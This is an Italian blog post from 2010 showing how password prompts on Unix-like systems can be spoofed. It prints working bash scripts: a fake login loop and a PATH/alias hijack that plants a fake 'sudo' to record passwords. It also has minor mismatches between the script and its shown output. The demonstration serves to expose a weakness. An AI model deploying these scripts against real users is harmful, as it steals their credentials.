---
date: 2010-04-09
categories:
  - sicurezza
---
# Bash is Dumb

Microsoft Windows è universalmente riconosciuto come il sistema operativo più insicuro della storia, e l'infinita quantità di sistemi attaccati con successo da software malvagio ce lo sta giornalmente a confermare. I vari Linux, Unix, e di conseguenza anche Mac, sono considerati intrinsecamente ed architetturalmente più sicuri. Ma sarà davvero così?  
  
Prendendo spunto da qualche idea presa qua e là, ho voluto provare a vedere se il sistema è davvero così inattaccabile come si dice.  
  
Spoofing negli anni 80  
L'idea è semplice e banale, oltre che vecchia come il cucco. Come rubare le password agli utenti di *nix senza nemmeno usare tecniche di attacco brute force contro le hash degli utenti (che negli anni '80 erano accessibili a tutti)?  
Più semplice che rubare caramelle ad un bambino: basta scrivere un bello script bash come il seguente:  
  

    
    while true; do
      clear
      echo -n Login:
      read login
      echo -n Password:
      read -s password
      echo \"$login\"; \"$password\" >> .password_rubate
      echo Sorry, please try again
    done
    
  
lanciarlo in esecuzione, e spostarsi dalla postazione lasciando attiva la propria sessione.  
  
Chiaro che tale tecnica di attacco ha delle **evidenti controindicazioni** : tanto per cominciare è in modalità testo ed oggi quasi tutti preferiscono la grafica; in secondo luogo un utente furbetto potrebbe facilmente accorgersi dell'inganno; in terzo luogo un amministratore lancerà un bel _userdel vostroaccount_ , con gioia ed allegria. E' un tipico esempio di phishing (o spoofing), il classico scherzo da aula informatica universitaria.  
  
Certo è un esempio banale, ma è interessante notare che il sistema non sta facendo nulla per proteggerci!  
  
Spoofing Moderno  
Il vecchio attacco potrebbe funzionare per davvero, ma se nessuno ne ha mai tratto grossi benefici forse una ragione c'è. Prendiamo spunto dall'esempio precedente, e saliamo (poco) di livello.  
  
Su piattaforma *nix esistono dei programmi che richiedono l'inserimento di una password per svolgere alcune operazioni; tali programmi potrebbero richiedere la password di un utente non privilegiato, oppure dell'utente root. In questo modo si viene incentivati ad utilizzare account con privilegi limitati, e questo è bene.  
  
Facciamo un breve controllo?  
  

    
    macbook-pro:~ fthiella$ echo $PATH
    /usr/bin:/bin:/usr/sbin:/sbin:/usr/local/bin:/usr/X11/bin
    macbook-pro:~ fthiella$ which su
    /usr/bin/su
    macbook-pro:~ fthiella$ which sudo
    /usr/bin/sudo
    
  
naturalmente _su_ e _sudo_ non sono file modificabili, e se scrivere un buon keylogger è complesso, eseguirlo senza privilegi è ancora più complicato. Vediamo se si può sfruttare qualche ingenuità della shell?  
  

    
    macbook-pro:~ fthiella$ touch ~/su
    macbook-pro:~ fthiella$ chmod +x ~/su
    macbook-pro:~ fthiella$ touch ~/sudo
    macbook-pro:~ fthiella$ touch +x ~/sudo
    macbook-pro:~ fthiella$ export PATH=~:$PATH
    macbook-pro:~ fthiella$ which su
    /Users/fthiella/su
    macbook-pro:~ fthiella$ which sudo
    /Users/fthiella/sudo
    
  
**argh!** Oppure anche questo è divertente:  
  

    
    macbook-pro:~ fthiella$ echo \#\!/bin/bash > ~/su
    macbook-pro:~ fthiella$ echo echo Perepèperepè >> ~/su
    macbook-pro:~ fthiella$ chmod +x ~/su
    macbook-pro:~ fthiella$ echo \#!/bin/bash > ~/sudo
    macbook-pro:~ fthiella$ echo echo Prrrrrrrrrrr >> ~/sudo
    macbook-pro:~ fthiella$ chmod +x ~/sudo
    macbook-pro:~ fthiella$ alias su=~/su
    macbook-pro:~ fthiella$ alias sudo=~/sudo
    macbook-pro:~ fthiella$ su -
    Perepèperepè
    macbook-pro:~ fthiella$ sudo apt-get update
    Prrrrrrrrrrr
    
  
did you get the point?  
  
Esempio  
Beh supponiamo di riuscire a convincere un utente scemotto ad eseguire il seguente scriptino. Come convincerlo? Un po' di ingegneria sociale... un programma che sembra utile ma contiene qualche funzioncina non documentata... un bug di qualche applicativo (es. FireFox) anche se eseguito con privilegi limitati.  
  

    
    #!/bin/bash
    if [[ `which sudo` == /usr/* ]]
    then
      echo "echo -n \"Password:\"" > ~/sudo
      echo "read -s password" >> ~/sudo
      echo "echo \"\$password\" >> ~/.password_rubate" >> ~/sudo
      echo "echo \"\$password\" | `which su` -S \$1 \$2 \$3 \$4 \$5 \$6 \$7 \$8 \$9" >> ~/sudo
      chmod +x ~/sudo
      export PATH=~:$PATH
    fi
    
  
funzionerà?  
  

    
    macbook-pro:~ fthiella$ echo $PATH
    /usr/bin:/bin:/usr/sbin:/sbin:/usr/local/bin:/usr/X11/bin
    macbook-pro:~ fthiella$ . ./attack.sh
    macbook-pro:~ fthiella$ echo $PATH
    /Users/fthiella:/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/bin:/usr/X11/bin
    macbook-pro:~ fthiella$ cat ~/sudo
    echo -n "Password:"
    read -s password
    echo "$password" >> ~/.steal_password
    echo "$password" | /usr/bin/sudo -S $1 $2 $3 $4 $5 $6 $7 $8 $9
    macbook-pro:~ fthiella$ sudo ls
    Password:
    
è interessante notare che la richiesta di password arriva dal finto sudo, e non da quello vero. Mediante semplici impostazioni che non richiedono privilegi elevati, possiamo intercettare con gaudio le password del sistema.  
  
Conclusioni  
Gli esempi sono talmente banali che molti si domanderanno se si tratti sul serio di un problema architetturale di sicurezza. Certo per metterlo in pratica con successo ci vuole molto altro, ma un problema **è difficile negare che non ci sia**.  
  
Forse impedire agli utenti di creare eseguibili nelle proprie aree aiuta molto (ma bisogna lavorare molto bene con i privilegi, e diventa un lavoro molto complesso).  
  
Naturalmente queste tecniche non funzionano in modalità grafica, ma se la protezione non viene garantita dal sistema operativo, ho come il sospetto che qualche trucco funzionante lo si trovi comunque.
